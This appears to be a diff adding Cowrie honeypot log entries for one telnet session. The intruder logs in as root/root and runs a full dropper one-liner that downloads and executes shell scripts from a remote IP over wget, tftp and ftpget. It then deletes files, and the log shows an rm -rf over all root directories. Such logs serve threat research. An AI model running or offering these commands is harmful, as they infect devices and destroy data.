@@ -2712,3 +2712,44 @@
 2017-03-03T14:13:27+0000 [CowrieTelnetTransport,34823,95.7.206.224] CMD: /bin/busybox KZREZ
 2017-03-03T14:13:27+0000 [CowrieTelnetTransport,34823,95.7.206.224] Command found: /bin/busybox KZREZ
 2017-03-03T14:13:49+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 1.55.193.47:57883 (10.8.41.81:2223) [session: TT34824]
+2017-03-03T14:14:24+0000 [CowrieTelnetTransport,34824,1.55.193.47] first time for 1.55.193.47, need: 1
+2017-03-03T14:14:24+0000 [CowrieTelnetTransport,34824,1.55.193.47] login attempt: 1
+2017-03-03T14:14:24+0000 [CowrieTelnetTransport,34824,1.55.193.47] login attempt [root/root] succeeded
+2017-03-03T14:14:26+0000 [CowrieTelnetTransport,34824,1.55.193.47] Opening TTY Log: log/tty/20170303-141426-None-34824i.log
+2017-03-03T14:14:26+0000 [CowrieTelnetTransport,34824,1.55.193.47] Warning: state changed and new state returned
+2017-03-03T14:14:46+0000 [CowrieTelnetTransport,34824,1.55.193.47] CMD: sh
+2017-03-03T14:14:46+0000 [CowrieTelnetTransport,34824,1.55.193.47] Command found: sh 
+2017-03-03T14:14:53+0000 [CowrieTelnetTransport,34824,1.55.193.47] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.237.120/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 89.34.237.120 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 89.34.237.120; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 89.34.237.120 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+2017-03-03T14:14:53+0000 [CowrieTelnetTransport,34824,1.55.193.47] Command found: cd /tmp
+2017-03-03T14:14:53+0000 [CowrieTelnetTransport,34824,1.55.193.47] Command found: cd /var/run
+2017-03-03T14:14:53+0000 [CowrieTelnetTransport,34824,1.55.193.47] Command found: cd /mnt
+2017-03-03T14:14:53+0000 [CowrieTelnetTransport,34824,1.55.193.47] Command found: cd /root
+2017-03-03T14:14:53+0000 [CowrieTelnetTransport,34824,1.55.193.47] Command found: cd /
+2017-03-03T14:14:53+0000 [CowrieTelnetTransport,34824,1.55.193.47] Command found: wget http://89.34.237.120/bins.sh
+2017-03-03T14:14:53+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://89.34.237.120/bins.sh>
+2017-03-03T14:14:53+0000 [HTTPPageDownloader,client] Not storing duplicate content 91691f2233108172e09a341e610087a74af2c60ec3c68054f9606790a89f28fe
+2017-03-03T14:14:53+0000 [HTTPPageDownloader,client] Downloaded URL (http://89.34.237.120/bins.sh) with SHA-256 91691f2233108172e09a341e610087a74af2c60ec3c68054f9606790a89f28fe to dl/91691f2233108172e09a341e610087a74af2c60ec3c68054f9606790a89f28fe
+2017-03-03T14:14:53+0000 [HTTPPageDownloader,client] Command found: chmod 777 /bins.sh
+2017-03-03T14:14:53+0000 [HTTPPageDownloader,client] Command found: sh /bins.sh
+2017-03-03T14:14:53+0000 [HTTPPageDownloader,client] Command found: tftp 89.34.237.120 -c get tftp1.sh
+2017-03-03T14:14:53+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-03-03T14:14:53+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-03-03T14:14:53+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 89.34.237.120
+2017-03-03T14:14:53+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-03-03T14:14:53+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-03-03T14:14:53+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 89.34.237.120 ftp1.sh ftp1.sh
+2017-03-03T14:14:54+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://89.34.237.120/ftp1.sh) with SHA-256 1c1c99fd4183e7c96dbbaef1a60cb5e9a50678b4461fc2150f3ab198d0609077 to dl/1c1c99fd4183e7c96dbbaef1a60cb5e9a50678b4461fc2150f3ab198d0609077
+2017-03-03T14:14:54+0000 [HTTPPageDownloader,client] Command found: sh /ftp1.sh
+2017-03-03T14:14:54+0000 [HTTPPageDownloader,client] Command found: rm -rf /bins.sh tftp1.sh tftp2.sh /ftp1.sh
+2017-03-03T14:14:54+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-03-03T14:14:54+0000 [HTTPPageDownloader,client] Command found: exit 
+2017-03-03T14:14:54+0000 [HTTPPageDownloader,client] Process ended. Telnet Session disconnected
+2017-03-03T14:14:54+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://89.34.237.120/bins.sh>
+2017-03-03T14:14:54+0000 [CowrieTelnetTransport,34824,1.55.193.47] Not storing duplicate content 91691f2233108172e09a341e610087a74af2c60ec3c68054f9606790a89f28fe
+2017-03-03T14:14:54+0000 [CowrieTelnetTransport,34824,1.55.193.47] Saved redir contents with SHA-256 91691f2233108172e09a341e610087a74af2c60ec3c68054f9606790a89f28fe to dl/91691f2233108172e09a341e610087a74af2c60ec3c68054f9606790a89f28fe
+2017-03-03T14:14:54+0000 [CowrieTelnetTransport,34824,1.55.193.47] Not storing duplicate content 1c1c99fd4183e7c96dbbaef1a60cb5e9a50678b4461fc2150f3ab198d0609077
+2017-03-03T14:14:54+0000 [CowrieTelnetTransport,34824,1.55.193.47] Saved redir contents with SHA-256 1c1c99fd4183e7c96dbbaef1a60cb5e9a50678b4461fc2150f3ab198d0609077 to dl/1c1c99fd4183e7c96dbbaef1a60cb5e9a50678b4461fc2150f3ab198d0609077
+2017-03-03T14:14:54+0000 [CowrieTelnetTransport,34824,1.55.193.47] Closing TTY Log: log/tty/20170303-141426-None-34824i.log after 27 seconds
+2017-03-03T14:14:54+0000 [CowrieTelnetTransport,34824,1.55.193.47] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-03-03T14:14:54+0000 [CowrieTelnetTransport,34824,1.55.193.47] Connection lost after 65 seconds
